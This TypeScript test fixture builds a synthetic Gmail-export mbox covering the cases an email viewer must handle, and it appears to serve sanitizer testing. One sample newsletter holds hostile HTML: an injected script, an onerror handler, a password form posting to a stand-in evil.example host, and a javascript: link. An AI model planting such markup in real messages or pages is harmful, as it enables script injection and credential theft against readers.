/**
 * Synthetic Google-Takeout-style mbox covering the cases the viewer must handle.
 * Used by unit tests and by `npm run sample` (writes sample.mbox for manual testing).
 */

const enc = new TextEncoder();

function b64(bytes: Uint8Array): string {
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/.{76}/g, '$&\r\n');
}

function encWord(s: string): string {
  return `=?UTF-8?B?${btoa(String.fromCharCode(...enc.encode(s)))}?=`;
}

/** A tiny but valid 1x1 PNG. */
export const PNG_BYTES = Uint8Array.from(
  atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='),
  (c) => c.charCodeAt(0),
);

/** Fake "PDF" with every byte value, to prove binary attachments survive intact. */
export const PDF_BYTES = (() => {
  const head = enc.encode('%PDF-1.4\n');
  const out = new Uint8Array(head.length + 256);
  out.set(head);
  for (let i = 0; i < 256; i++) out[head.length + i] = i;
  return out;
})();

interface Msg {
  from: string;
  to: string;
  cc?: string;
  subject: string;
  date: string;
  id: string;
  thrid: string;
  labels: string;
  inReplyTo?: string;
  references?: string;
  extraHeaders?: string[];
  /** Content-Type header value + body, already encoded. */
  contentType: string;
  cte?: string;
  body: string | Uint8Array;
  crlf?: boolean;
  separatorFrom?: string;
}

function build(m: Msg): Uint8Array {
  const nl = m.crlf ? '\r\n' : '\n';
  const headers = [
    `X-GM-THRID: ${m.thrid}`,
    `X-Gmail-Labels: ${m.labels}`,
    `Delivered-To: owner@example.com`,
    `Message-ID: <${m.id}>`,
    ...(m.inReplyTo ? [`In-Reply-To: <${m.inReplyTo}>`] : []),
    ...(m.references ? [`References: ${m.references}`] : []),
    `Date: ${m.date}`,
    `From: ${m.from}`,
    `To: ${m.to}`,
    ...(m.cc ? [`Cc: ${m.cc}`] : []),
    `Subject: ${m.subject}`,
    `MIME-Version: 1.0`,
    `Content-Type: ${m.contentType}`,
    ...(m.cte ? [`Content-Transfer-Encoding: ${m.cte}`] : []),
    ...(m.extraHeaders ?? []),
  ];
  const sep = `From ${m.separatorFrom ?? m.thrid + '@xxx'} Mon Mar 04 15:15:00 +0000 2024`;
  const head = enc.encode(sep + '\n' + headers.join(nl) + nl + nl);
  const body = typeof m.body === 'string' ? enc.encode(m.body.replace(/\r?\n/g, nl)) : m.body;
  const tail = enc.encode(nl + nl);
  const out = new Uint8Array(head.length + body.length + tail.length);
  out.set(head);
  out.set(body, head.length);
  out.set(tail, head.length + body.length);
  return out;
}

function concat(parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.length;
  }
  return out;
}

export function sampleMessages(fillers = 0): Msg[] {
  const msgs: Msg[] = [];

  // 1. Thread start: plain text, windows-1252 quoted-printable with smart quotes.
  msgs.push({
    thrid: '1790000000000000001',
    id: 'thread1-a@example.com',
    labels: 'Inbox,Important,Opened,Work/Clients',
    from: '"Doe, Jane" <jane@client.example>',
    to: 'Owner Person <owner@example.com>',
    subject: 'Q3 budget review',
    date: 'Mon, 4 Mar 2024 10:15:00 -0500',
    contentType: 'text/plain; charset=windows-1252',
    cte: 'quoted-printable',
    body: 'Hi there,\n\nHere=92s the =93final=94 budget =96 please review by Friday=85\n\nThanks,\nJane\n',
  });

  // 2. Reply from owner (Sent), HTML with gmail_quote.
  msgs.push({
    thrid: '1790000000000000001',
    id: 'thread1-b@example.com',
    labels: 'Sent,Opened,Work/Clients',
    from: 'Owner Person <owner@example.com>',
    to: '"Doe, Jane" <jane@client.example>',
    subject: 'Re: Q3 budget review',
    date: 'Mon, 4 Mar 2024 11:02:00 -0500',
    inReplyTo: 'thread1-a@example.com',
    references: '<thread1-a@example.com>',
    contentType: 'multipart/alternative; boundary="alt1"',
    body:
      '--alt1\nContent-Type: text/plain; charset=UTF-8\n\nLooks good to me.\n\nOn Mon, Mar 4, 2024 at 10:15 AM Jane Doe <jane@client.example> wrote:\n> Hi there,\n> Here’s the budget\n\n' +
      '--alt1\nContent-Type: text/html; charset=UTF-8\n\n<div dir="ltr">Looks good to me.</div><br><div class="gmail_quote"><div class="gmail_attr">On Mon, Mar 4, 2024 at 10:15 AM Jane Doe &lt;jane@client.example&gt; wrote:<br></div><blockquote class="gmail_quote">Hi there,<br>Here’s the budget</blockquote></div>\n' +
      '--alt1--\n',
  });

  // 3. Unread reply with PDF attachment and inline cid image (multipart/mixed > related > alternative).
  msgs.push({
    thrid: '1790000000000000001',
    id: 'thread1-c@example.com',
    labels: 'Inbox,Unread,Starred,Work/Clients',
    from: '"Doe, Jane" <jane@client.example>',
    to: 'Owner Person <owner@example.com>',
    cc: 'Bob Builder <bob@client.example>',
    subject: 'Re: Q3 budget review',
    date: 'Tue, 5 Mar 2024 09:30:00 -0500',
    inReplyTo: 'thread1-b@example.com',
    references: '<thread1-a@example.com> <thread1-b@example.com>',
    contentType: 'multipart/mixed; boundary="mix1"',
    body:
      '--mix1\nContent-Type: multipart/related; boundary="rel1"\n\n' +
      '--rel1\nContent-Type: text/html; charset=UTF-8\n\n<p>Signed copy attached. Logo: <img src="cid:logo123@x" alt="logo"></p>\n' +
      '--rel1\nContent-Type: image/png\nContent-ID: <logo123@x>\nContent-Transfer-Encoding: base64\n\n' +
      b64(PNG_BYTES) +
      '\n--rel1--\n' +
      '--mix1\nContent-Type: application/pdf; name="budget-final.pdf"\nContent-Disposition: attachment; filename="budget-final.pdf"\nContent-Transfer-Encoding: base64\n\n' +
      b64(PDF_BYTES) +
      '\n--mix1--\n',
  });

  // 4. Newsletter: encoded-word subject with emoji, remote images, hostile markup, Promotions category.
  msgs.push({
    thrid: '1790000000000000002',
    id: 'promo-1@shop.example',
    labels: 'Inbox,Category Promotions,Unread',
    from: `${encWord('Shöp Délice')} <deals@shop.example>`,
    to: 'owner@example.com',
    subject: encWord('🎉 Spring sale — 40% off'),
    date: 'Wed, 6 Mar 2024 08:00:00 +0000',
    contentType: 'text/html; charset=UTF-8',
    cte: 'base64',
    body: b64(
      enc.encode(
        '<html><head><style>.hero{background:url(https://tracker.example/bg.png)} p{color:#333}</style></head><body>' +
          '<script>window.parent.hacked = true</script>' +
          '<img src="https://tracker.example/pixel.gif" width="1" height="1" onerror="window.parent.hacked=true">' +
          '<div class="hero"><h1>Spring sale 🌷</h1><p>Everything 40% off. <a href="https://shop.example/sale">Shop now</a></p></div>' +
          '<form action="https://evil.example/steal"><input name="password"></form>' +
          '<a href="javascript:alert(1)">bad link</a></body></html>',
      ),
    ),
  });

  // 5. Outlook-style reply (divRplyFwdMsg), separate thread linked by References only (no thrid shared).
  msgs.push({
    thrid: '1790000000000000003',
    id: 'outlook-1@corp.example',
    labels: 'Inbox,Opened,"Projects, 2024"',
    from: 'Carlos Ruiz <carlos@corp.example>',
    to: 'owner@example.com',
    subject: 'RE: Site visit',
    date: 'Thu, 7 Mar 2024 14:45:00 +0100',
    contentType: 'text/html; charset=iso-8859-1',
    cte: 'quoted-printable',
    body:
      '<div>Confirmed for Tuesday. Se=F1or Ruiz will attend.</div>' +
      '<div id=3D"appendonsend"></div><hr><div id=3D"divRplyFwdMsg"><b>From:</b> Owner<br><b>Sent:</b> Wed<br><b>Subject:</b> Site visit</div><div>Original question here</div>',
  });

  // 6. Body with mbox-escaped From lines; spam.
  msgs.push({
    thrid: '1790000000000000004',
    id: 'spam-1@spam.example',
    labels: 'Spam,Unread',
    from: 'Prince <prince@spam.example>',
    to: 'owner@example.com',
    subject: 'URGENT business proposal',
    date: 'Fri, 8 Mar 2024 03:00:00 +0000',
    contentType: 'text/plain; charset=us-ascii',
    body: 'Dear friend,\n>From the desk of the prince.\n>>From the archives.\nSend money.\n',
  });

  // 7. CRLF line endings, trashed, latin-1 8bit body.
  msgs.push({
    thrid: '1790000000000000005',
    id: 'crlf-1@example.com',
    labels: 'Trash,Opened',
    from: 'Zoë <zoe@example.org>',
    to: 'owner@example.com',
    subject: 'Old thing',
    date: 'Sat, 9 Mar 2024 12:00:00 +0000',
    contentType: 'text/plain; charset=utf-8',
    cte: '8bit',
    body: 'Café crème — naïve résumé.\nSecond line.\n',
    crlf: true,
  });

  // 8. Draft.
  msgs.push({
    thrid: '1790000000000000006',
    id: 'draft-1@example.com',
    labels: 'Drafts',
    from: 'Owner Person <owner@example.com>',
    to: 'team@example.com',
    subject: 'Offsite ideas',
    date: 'Sun, 10 Mar 2024 18:00:00 +0000',
    contentType: 'text/plain; charset=utf-8',
    body: 'Half-written thoughts about the offsite.\n',
  });

  // 9. Social category + nested label sibling.
  msgs.push({
    thrid: '1790000000000000007',
    id: 'social-1@social.example',
    labels: 'Inbox,Category Social,Opened,Work/Hiring',
    from: 'Network <notify@social.example>',
    to: 'owner@example.com',
    subject: 'You have 3 new connection requests',
    date: 'Mon, 11 Mar 2024 07:00:00 +0000',
    contentType: 'text/plain; charset=utf-8',
    body: 'See who wants to connect.\n',
  });

  for (let i = 0; i < fillers; i++) {
    const d = new Date(Date.UTC(2023, 0, 1) + i * 36e5 * 7);
    msgs.push({
      thrid: String(1780000000000000000n + BigInt(i)),
      id: `filler-${i}@lists.example`,
      labels: i % 3 === 0 ? 'Inbox,Category Updates,Opened' : i % 5 === 0 ? 'Inbox,Unread' : 'Inbox,Opened',
      from: `Sender ${i % 17} <sender${i % 17}@lists.example>`,
      to: 'owner@example.com',
      subject: `Weekly digest #${i}`,
      date: d.toUTCString(),
      contentType: 'text/plain; charset=utf-8',
      body: `Digest number ${i}. Keyword-${i % 7}.\n`,
    });
  }
  return msgs;
}

export function buildSampleMbox(fillers = 0): Uint8Array {
  return concat(sampleMessages(fillers).map(build));
}
